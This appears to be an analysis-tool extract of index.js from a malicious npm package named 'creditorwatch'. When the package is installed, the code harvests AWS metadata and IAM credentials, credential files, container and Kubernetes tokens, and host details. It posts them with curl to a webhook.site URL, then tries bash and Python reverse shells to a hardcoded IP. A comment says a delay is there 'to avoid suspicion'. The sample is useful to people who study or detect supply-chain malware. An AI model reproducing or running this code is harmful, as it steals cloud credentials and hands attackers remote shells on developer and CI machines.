// File: tmp/tmp9tth9a0e/creditorwatch/package/index.js
// ======================================================================
Line 1: _tmp_20 = require('child_process')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: const os = require('os')
Line 9: execSync(cmd, { encoding: 'utf8', timeout: 10000 })
Line 17: const metadataBase = 'http://169.254.169.254/latest/meta-data/'
Line 18: const credentialsBase = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
Line 23: executeCommand(roleCmd).trim()
Line 25: roleName.includes('Error')
Line 36: _tmp_2.credentials = JSON.parse(credentials)
Line 37: instanceId.trim()
Line 38: region.trim()
Line 54: Object.keys(envVars)
Line 55: {
            awsEnvVars[key] = envVars[key];
        }
Line 56: awsEnvVars[key] = envVars[key]
Line 66: _tmp_5.push("~/.aws/credentials")
Line 67: _tmp_5.push("~/.aws/config")
Line 68: _tmp_5.push("/root/.aws/credentials")
Line 69: _tmp_5.push("/root/.aws/config")
Line 70: _tmp_5.push("/home/*/.aws/credentials")
Line 71: _tmp_5.push("/var/lib/jenkins/.aws/credentials")
Line 72: _tmp_5.push("/opt/aws/credentials")
Line 79: {
                foundCreds[credPath] = fs.readFileSync(credPath, 'utf8');
            }
Line 80: foundCreds[credPath] = fs.readFileSync(credPath, 'utf8')
Line 96: <operator>.formatString("http://169.254.170.2", process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI, "")
Line 99: containerCreds.ecsTaskRole = JSON.parse(ecsCreds)
Line 109: containerCreds.k8sServiceAccount = fs.readFileSync(serviceAccountPath, 'utf8')
Line 122: os.hostname()
Line 123: os.platform()
Line 124: executeCommand('whoami').trim()
Line 129: Buffer.from(JSON.stringify(exfilData)).toString('base64')
Line 135: <operator>.formatString("curl -X POST https://webhook.site/50253029-1ec3-4b4a-9646-fc25a2b21963 -H "Content-Type: application/json" -d '", JSON.stringify(exfilData), "' --connect-timeout 5")
Line 144: {
    const attackerIP = '143.110.254.249';
    const attackerPort = '1337'; 
    
    // Multiple reverse shell attempts
    const shells = [
        `bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1`,
        `python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attackerIP}',${attackerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"`
    ];
    
    shells.forEach(shell => {
        try {
            executeCommand(shell);
        } catch (error) {
            // Continue to next shell method
        }
    });
}
Line 149: const shells = [
        `bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1`,
        `python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attackerIP}',${attackerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"`
    ]
Line 150: _tmp_13.push(<operator>.formatString("bash -i >& /dev/tcp/", attackerIP, "/", attackerPort, " 0>&1"))
Line 151: _tmp_13.push(<operator>.formatString("python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('", attackerIP, "',", attackerPort, "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])""))
Line 164: {
    console.log('Installing creditorwatch package...');
    
    // Small delay to avoid suspicion
    setTimeout(() => {
        const awsCredentials = {
            metadata: extractAWSMetadata(),
            environment: extractEnvCredentials(), 
            files: searchAWSCredentials(),
            container: extractContainerCredentials(),
            systemInfo: {
                hostname: os.hostname(),
                user: executeCommand('whoami').trim(),
                id: executeCommand('id').trim(),
                pwd: executeCommand('pwd').trim(),
                uname: executeCommand('uname -a').trim()
            }
        };
        
        // Exfiltrate AWS credentials
        exfiltrateData(awsCredentials);
        
        // Establish reverse shell for manual interaction
        establishReverseShell();
        
    }, 2000);
}
Line 168: setTimeout(() => {
        const awsCredentials = {
            metadata: extractAWSMetadata(),
            environment: extractEnvCredentials(), 
            files: searchAWSCredentials(),
            container: extractContainerCredentials(),
            systemInfo: {
                hostname: os.hostname(),
                user: executeCommand('whoami').trim(),
                id: executeCommand('id').trim(),
                pwd: executeCommand('pwd').trim(),
                uname: executeCommand('uname -a').trim()
            }
        };
        
        // Exfiltrate AWS credentials
        exfiltrateData(awsCredentials);
        
        // Establish reverse shell for manual interaction
        establishReverseShell();
        
    }, 2000)
Line 172: searchAWSCredentials()
Line 175: os.hostname()
Line 176: executeCommand('whoami').trim()
Line 177: executeCommand('id').trim()
Line 178: executeCommand('pwd').trim()
Line 179: executeCommand('uname -a').trim()
Line 193: main()
